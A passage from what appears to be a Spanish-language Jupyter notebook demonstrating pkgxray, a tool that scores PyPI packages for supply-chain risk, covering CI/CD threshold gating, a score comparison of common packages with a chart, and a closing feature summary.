    """Analiza un paquete y retorna True si es seguro (score < umbral)."""
    resultado = subprocess.run(
        [sys.executable, "-m", "pkgxray.cli", "scan", paquete, "--fail-above", str(umbral)],
        capture_output=True, text=True
    )
    aprobado = resultado.returncode == 0
    return aprobado

# Simular pipeline de CI/CD
UMBRAL = 50
dependencias = ["more-itertools", "attrs", "click", "flask"]

print(f"Auditando {len(dependencias)} dependencias (umbral: {UMBRAL}/100)\n")

for paquete in dependencias:
    from pkgxray import scan
    r = scan(paquete)
    estado = "✓ APROBADO" if r.risk_score < UMBRAL else "✗ RECHAZADO"
    print(f"  {estado}  {paquete:25} score={r.risk_score:3}/100  [{r.risk_level}]")

In [ ]:
# Demostración de códigos de salida
print("=== Comportamiento de --fail-above ===")
print()

# Paquete seguro con umbral generoso → exit code 0
!pkgxray scan more-itertools --fail-above 80 && echo "Exit code: 0 (seguro)" || echo "Exit code: 1 (riesgoso)"
print()

# Paquete con score moderado con umbral bajo → exit code 1
!pkgxray scan paramiko --fail-above 20 && echo "Exit code: 0 (aprobado)" || echo "Exit code: 1 (bloqueado por umbral)"

---
## Parte 10 — Comparativa de paquetes reales

Analizamos un conjunto diverso de paquetes de PyPI para demostrar que el scorer
calibra correctamente: paquetes legítimos obtienen scores bajos, y los patrones
sospechosos generan scores altos.

In [ ]:
from pkgxray import scan

paquetes = [
    # (nombre, versión_o_None, descripción)
    ("more-itertools", None, "utilidades puras"),
    ("attrs",          None, "dataclasses avanzado"),
    ("click",          None, "CLI framework"),
    ("flask",          None, "web framework"),
    ("requests",       None, "HTTP library"),
    ("boto3",          None, "AWS SDK (muchos env_access)"),
    ("paramiko",       None, "SSH library"),
]

print(f"{'Paquete':20} {'Score':>5}  {'Nivel':10}  {'Descripción'}")
print("-" * 65)

resultados = []
for nombre, version, desc in paquetes:
    try:
        r = scan(nombre, version=version)
        resultados.append((nombre, r.risk_score, r.risk_level, desc))
        barra = "█" * (r.risk_score // 5)
        print(f"{nombre:20} {r.risk_score:5}  {r.risk_level:10}  {desc}")
    except Exception as e:
        print(f"{nombre:20} ERROR: {e}")

In [ ]:
# Visualizar con matplotlib si está disponible
try:
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches

    nombres = [r[0] for r in resultados]
    scores  = [r[1] for r in resultados]
    niveles = [r[2] for r in resultados]

    colores = {
        "LOW":      "#22c55e",
        "MODERATE": "#f59e0b",
        "HIGH":     "#f97316",
        "CRITICAL": "#ef4444",
    }

    fig, ax = plt.subplots(figsize=(10, 5))
    bars = ax.barh(nombres, scores, color=[colores[n] for n in niveles])

    ax.set_xlabel("Risk Score (0-100)")
    ax.set_title("pkgxray v1.0.0 — Comparativa de paquetes reales")
    ax.set_xlim(0, 100)

    # Añadir umbrales
    for x, label in [(15, "LOW"), (35, "MODERATE"), (60, "HIGH")]:
        ax.axvline(x, color="gray", linestyle="--", alpha=0.5, linewidth=0.8)
        ax.text(x+1, -0.7, label, fontsize=7, color="gray")

    # Añadir valores
    for bar, score in zip(bars, scores):
        ax.text(score + 0.5, bar.get_y() + bar.get_height()/2,
                str(score), va='center', fontsize=9)

    # Leyenda
    patches = [mpatches.Patch(color=c, label=n) for n, c in colores.items()]
    ax.legend(handles=patches, loc='lower right')

    plt.tight_layout()
    plt.show()

except ImportError:
    print("matplotlib no disponible — tabla ya mostrada arriba")

---
## Conclusión

Este notebook demostró todas las funcionalidades de **pkgxray v1.0.0**:

| Funcionalidad | Cubierta |
|---------------|----------|
| CLI completo con todos sus flags | ✓ Parte 1 |
| API Python — todos los campos de ScanResult y Finding | ✓ Parte 2 |
| Los 10 analizadores con ejemplos sintéticos | ✓ Parte 3 |
| Sistema de puntuación: pesos, caps y combos | ✓ Parte 4 |
| Comparativa v0.3.0 → v1.0.0 | ✓ Parte 5 |
| Formatos de salida: terminal, JSON, HTML | ✓ Parte 6 |
| Caché en disco con LRU eviction | ✓ Parte 7 |
| Registros privados y validación SSRF | ✓ Parte 8 |
| Integración CI/CD con `--fail-above` | ✓ Parte 9 |
| Comparativa de paquetes reales con visualización | ✓ Parte 10 |

### ¿Qué hace pkgxray mejor que las alternativas?

- **Análisis de comportamiento**, no solo CVEs
- **Sin instalar el paquete** — nunca ejecuta código del paquete objetivo
- **10 analizadores especializados** que se complementan mediante combos de scoring
- **Caché eficiente** — el segundo escaneo del mismo paquete es casi instantáneo
- **Integración fácil** en CLI, API Python y pipelines de CI/CD
- **Open source y sin cuenta requerida**

```bash
pip install pkgxray
pkgxray scan <cualquier-paquete>
```